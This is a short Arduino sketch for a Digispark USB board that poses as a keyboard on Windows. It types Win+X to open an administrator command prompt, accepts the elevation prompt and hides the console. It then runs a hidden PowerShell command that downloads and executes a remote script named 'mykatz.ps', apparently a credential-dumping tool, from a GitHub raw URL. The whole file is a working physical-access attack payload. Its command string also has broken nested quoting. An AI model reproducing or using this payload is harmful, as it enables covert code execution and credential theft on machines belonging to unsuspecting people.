#include "DigiKeyboard.h" /* Digistump drives. */
#include <avr/pgmspace.h> /* Fix memory issues. */

void setup() {
  DigiKeyboard.update();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // Win + X
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_A); // It would open cmd as Admin (or Powershell as Admin)
  DigiKeyboard.delay(2000); // this delay depends on the system response
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // select option 'yes'
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // confirm the prompt
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mode con:cols=18 lines=1 && color FE && powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/gmattos/Spark_Duckmon/master/mykatz.ps -outfile "file.ps")"); // minimize the cmd & open powershell
  delay(100); /* Delay until it opens. */
  for(;;) { /* run just once. */ }
  DigiKeyboard.print("exit"); // exit cmd
}
